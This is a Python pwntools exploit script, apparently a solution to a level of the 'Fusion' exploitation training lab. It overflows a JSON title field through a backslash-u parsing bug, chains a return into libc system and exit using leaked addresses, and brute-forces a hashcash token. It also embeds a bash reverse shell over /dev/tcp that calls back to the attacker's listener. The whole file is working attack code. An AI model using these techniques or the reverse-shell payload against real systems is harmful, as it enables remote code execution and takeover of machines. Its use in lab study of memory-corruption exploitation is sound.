import random, string, hmac
import hashlib
import json
import struct
import time
import pwn
import sys

import leak_libc
from leak_libc import LeakableValue
from leak_libc import LeakMethod


rhost = 'fusion'
rport = 20003
ssrf_callback_port = 8000
reverse_shell_callback_port = 8001
lhost = '192.168.6.1'

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def generate_payload(tag: str, libc_system_address: int, libc_exit_address: int, gTitle_string_reference: int) -> bytes:
    # Bad characters: NULL byte (0x00) and backwards slash (0x5c)
    title_expected_length = 128
    distance_from_overflow_to_return_pointer = 35

    payload = f'/bin/bash -i >& /dev/tcp/{lhost}/{reverse_shell_callback_port} 0>&1 #' # Will get written into the contents field. We will make this execute as a shell command


    rop_chain: bytes = b''
    rop_chain += pwn.p32(libc_system_address)       # What to execute
    rop_chain += pwn.p32(libc_exit_address)         # Where to return
    rop_chain += pwn.p32(gTitle_string_reference)   # What command to execute

    malicious_title: bytes = payload.encode() + b'A' * (title_expected_length - 1 - len(payload))
    malicious_title += b'\\\u' # \u symbol in input will push the counter forward by 2 and the while loop will not terminate at the expected location
    malicious_title += b'B' * distance_from_overflow_to_return_pointer
    malicious_title += rop_chain

    payload: bytes = f'{{"tags": ["{tag}"], "contents": "test", "serverip": "{lhost}:{ssrf_callback_port}", "title": "'.encode()
    payload += malicious_title
    payload += b'" }'

    return payload
    

def calculate_libc_addresses(libc_start_main_address: hex) -> (int, int):
    pwn.log.info(f'Calculating libc addresses from supplied __libc_start_main address: {hex(libc_start_main_address)}')

    libc = pwn.ELF('./libc6_2.13-20ubuntu5_i386.so')
    libc.address = libc_start_main_address - libc.symbols['__libc_start_main'] # Set the new ASLR'd base address
    pwn.log.info('libc base address is: {}'.format(hex(libc.address)))

    libc_system_address = libc.symbols['system']
    pwn.log.info('libc system function address is: {}'.format(hex(libc_system_address)))
    
    libc_exit_address = libc.symbols['exit'] # Just used to exit cleanly after shell closed
    pwn.log.info('libc exit function address is: {}'.format(hex(libc_exit_address)))

    return (libc_system_address, libc_exit_address)

def generate_hashcashed_payload(token: str, libc_start_main_address: hex, gTitle_string_reference: hex) -> bytes:
    libc_system_address, libc_exit_address = calculate_libc_addresses(libc_start_main_address)

    pwn.log.info('Generating hashcashed payload')
    while (True):
        request_body: bytes = generate_payload(
            tag=random_string(20),
            libc_system_address=libc_system_address,
            libc_exit_address=libc_exit_address,
            gTitle_string_reference=gTitle_string_reference,
        )
        
        payload = token.encode() + b'\n' + request_body
        hashed = hmac.new(token.encode(), payload, hashlib.sha1)
     
        if hashed.hexdigest()[:4] == "0000":
            pwn.log.info("Payload:")
            print(payload)
            pwn.log.info(f"Hash: {hashed.hexdigest()}")
            return payload


def receive_token(io) -> str:
    token: str = io.recvline().decode().split('"')[1]
    pwn.log.info(f"Token: {token}")
    return token
    

def main():
    libc_start_main_address = leak_libc.main(LeakableValue.LIBC_START_MAIN)
    gTitle_string_reference  = leak_libc.main(LeakableValue.GTITLE)
    # libc_start_main_address = 0xb7451020 # You can use a a static address for exploit development to speed things up
    # gTitle_string_reference = 0x0951c670

    pwn.log.info('Going to exploit the application...')

    callback_listener = pwn.listen(reverse_shell_callback_port)
    io = pwn.remote(rhost, rport)

    token = receive_token(io)
    payload: bytes = generate_hashcashed_payload(token, libc_start_main_address, gTitle_string_reference)

    io.send(payload)
    pwn.log.info('Payload sent!')
    io.close()

    callback_listener.wait_for_connection()
    callback_listener.interactive()

if __name__ == "__main__":
    main()

